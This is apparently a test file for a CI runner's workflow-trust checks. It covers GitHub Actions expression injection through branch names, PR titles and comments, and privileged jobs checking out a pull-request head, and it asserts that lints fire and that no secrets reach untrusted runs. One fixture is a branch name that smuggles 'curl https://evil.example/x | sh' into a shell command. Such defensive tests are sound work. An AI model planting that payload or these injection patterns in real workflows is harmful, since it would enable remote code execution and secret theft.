// Hostile corpus for issue #37: each case is an attack on a workflow definition. Every one must
// end with no credentials in reach of attacker-controlled input, either because planning fails
// (protected and release runs), or because the run is untrusted and holds nothing.
import { describe, expect, test } from "bun:test";
import {
  PlanError,
  planJob,
  planWorkflow,
  workflowHeadCheckouts,
  type PlanWarning,
} from "@turntable/act-runner";
import { assessJob, credentialsFor, lintFailsFor, type RunFacts } from "../src/trust";

const readFile = (): undefined => undefined;

const wf = (on: string, steps: string): string =>
  `on: ${on}\njobs:\n  job:\n    runs-on: ubuntu-latest\n    steps:\n${steps}`;

/** What the server does for one job: assess the class, plan with the class's lint strictness. */
function plan(
  yaml: string,
  facts: RunFacts,
): { warnings: PlanWarning[]; error?: PlanError; klass: string; secrets: boolean } {
  const heads = workflowHeadCheckouts(yaml)["job"] ?? [];
  const a = assessJob(facts, heads.length > 0);
  try {
    const p = planJob(yaml, "job", {
      workflowPath: ".github/workflows/ci.yml",
      event: facts.event,
      readFile,
      failOnLint: lintFailsFor(a.klass),
    });
    return { warnings: p.warnings, klass: a.klass, secrets: credentialsFor(a.klass).secrets };
  } catch (e) {
    if (!(e instanceof PlanError)) throw e;
    return { warnings: [], error: e, klass: a.klass, secrets: credentialsFor(a.klass).secrets };
  }
}

const PUSH_MAIN: RunFacts = { event: "push", ref: "refs/heads/main" };
const PR: RunFacts = { event: "pull_request", ref: "refs/pull/7/merge" };
const PR_TARGET: RunFacts = { event: "pull_request_target", ref: "refs/pull/7/head" };

describe("branch-name injection", () => {
  const hostile = 'main"; curl https://evil.example/x | sh; echo "';
  const sources = [
    "github.head_ref",
    "github.event.pull_request.head.ref",
    "github.event.pull_request.head.label",
    "github.event.workflow_run.head_branch",
  ];

  test.each(sources)("%s in run: fails a protected run and warns an untrusted one", (expr) => {
    const yaml = wf("[push, pull_request, workflow_run]", `      - run: echo "\${{ ${expr} }}"\n`);
    // The attack string is attacker-controlled data: the lint must trigger on the EXPRESSION, not the value.
    expect(hostile).toContain("curl");

    const protectedRun = plan(yaml, PUSH_MAIN);
    expect(protectedRun.error?.feature).toBe("lint");
    expect(protectedRun.error?.message).toContain(expr);

    const pr = plan(yaml, PR);
    expect(pr.error).toBeUndefined();
    expect(pr.warnings.map((w) => w.code)).toEqual(["untrusted-expression"]);
    expect(pr.klass).toBe("untrusted_pr");
    expect(pr.secrets).toBe(false);
  });

  test("the safe form passes everywhere: the value goes through env, never the script", () => {
    const yaml = wf(
      "[push, pull_request]",
      `      - env:\n          BRANCH: \${{ github.head_ref }}\n        run: echo "$BRANCH"\n`,
    );
    for (const facts of [PUSH_MAIN, PR]) {
      const r = plan(yaml, facts);
      expect(r.error).toBeUndefined();
      expect(r.warnings).toEqual([]);
    }
  });
});

describe("PR-title and comment injection", () => {
  test.each([
    "github.event.pull_request.title",
    "github.event.pull_request.body",
    "github.event.issue.title",
    "github.event.issue.body",
    "github.event.comment.body",
    "github.event.review.body",
    "github.event.head_commit.message",
    "github.event.commits[0].message",
  ])("%s", (expr) => {
    const yaml = wf(
      "[push, pull_request, issue_comment]",
      `      - run: |\n          echo "\${{ ${expr} }}"\n`,
    );
    expect(plan(yaml, PUSH_MAIN).error?.feature).toBe("lint");
    const pr = plan(yaml, PR);
    expect(pr.error).toBeUndefined();
    expect(pr.warnings).toHaveLength(1);
    expect(pr.secrets).toBe(false);
  });

  test("a release run fails the same way", () => {
    const yaml = wf("push", `      - run: echo "\${{ github.event.pull_request.title }}"\n`);
    const r = plan(yaml, { event: "push", ref: "refs/tags/v1.0.0" });
    expect(r.klass).toBe("release");
    expect(r.error?.feature).toBe("lint");
  });

  test("injection through actions/github-script is caught too", () => {
    const yaml = wf(
      "pull_request",
      `      - uses: actions/github-script@${"a".repeat(40)}\n        with:\n          script: console.log("\${{ github.event.pull_request.title }}")\n`,
    );
    expect(plan(yaml, PR).warnings).toHaveLength(1);
    expect(plan(yaml, PUSH_MAIN).error?.feature).toBe("lint");
  });
});

describe("checking out the PR head in a privileged job", () => {
  const CO = `actions/checkout@${"c".repeat(40)}`;
  const headCheckout = (field: string, expr: string): string =>
    wf(
      "pull_request_target",
      `      - uses: ${CO}\n        with:\n          ${field}: \${{ ${expr} }}\n      - run: ./scripts/build.sh\n`,
    );

  test.each([
    ["ref", "github.event.pull_request.head.sha"],
    ["ref", "github.event.pull_request.head.ref"],
    ["ref", "github.head_ref"],
    ["repository", "github.event.pull_request.head.repo.full_name"],
    ["ref", "github.event.workflow_run.head_sha"],
  ])("%s: %s is found, flagged, demoted, and ends with no credentials", (field, expr) => {
    const yaml = headCheckout(field, expr);
    expect((workflowHeadCheckouts(yaml)["job"] ?? []).length).toBe(1);
    // A trusted-looking same-repo PR author does not help: the job still takes the head.
    const facts: RunFacts = {
      event: "pull_request_target",
      ref: "refs/heads/main",
      fork: false,
      authorTrusted: true,
    };
    const heads = workflowHeadCheckouts(yaml)["job"] ?? [];
    const a = assessJob(facts, heads.length > 0);
    expect(a.klass).toBe("untrusted_pr");
    expect(a.demotedFrom).toBe("trusted_pr");
    expect(credentialsFor(a.klass)).toEqual({ secrets: false, writeToken: false });
    // The lint names it.
    const p = planJob(yaml, "job", {
      workflowPath: ".github/workflows/x.yml",
      event: "pull_request_target",
      readFile,
    });
    expect(p.warnings.map((w) => w.code)).toEqual(["privileged-head-checkout"]);
    // And if the run were somehow classed protected, planning refuses it outright.
    expect(() =>
      planJob(yaml, "job", {
        workflowPath: ".github/workflows/x.yml",
        event: "pull_request_target",
        readFile,
        failOnLint: true,
      }),
    ).toThrow(/pull request head/);
  });

  test("the same checkout under a plain pull_request trigger is not flagged (no privilege to lose)", () => {
    const yaml = headCheckout("ref", "github.event.pull_request.head.sha").replace(
      "pull_request_target",
      "pull_request",
    );
    const p = planJob(yaml, "job", {
      workflowPath: ".github/workflows/x.yml",
      event: "pull_request",
      readFile,
    });
    expect(p.warnings).toEqual([]);
  });

  test("a privileged trigger delivered the PR head ref is demoted without any workflow help", () => {
    const a = assessJob(PR_TARGET);
    expect(a.klass).toBe("untrusted_pr");
    expect(credentialsFor(a.klass).secrets).toBe(false);
  });

  test("a privileged job that stays on the base (default checkout) is not flagged", () => {
    const yaml = wf(
      "pull_request_target",
      `      - uses: ${CO}\n      - run: ./scripts/label.sh\n`,
    );
    expect(workflowHeadCheckouts(yaml)["job"]).toEqual([]);
    expect(
      planJob(yaml, "job", {
        workflowPath: "w.yml",
        event: "pull_request_target",
        readFile,
        failOnLint: true,
      }).warnings,
    ).toEqual([]);
  });

  test("planWorkflow flags it per job and can fail the whole plan", () => {
    const yaml = headCheckout("ref", "github.event.pull_request.head.sha");
    const ev = { name: "pull_request_target", ref: "refs/pull/1/head", baseRef: "main" } as const;
    const p = planWorkflow(yaml, ev, { readFile });
    expect(p.warnings.map((w) => w.code)).toEqual(["privileged-head-checkout"]);
    expect(p.warnings[0]?.step).toContain("job:");
    expect(() => planWorkflow(yaml, ev, { readFile, failOnLint: true })).toThrow(PlanError);
  });
});
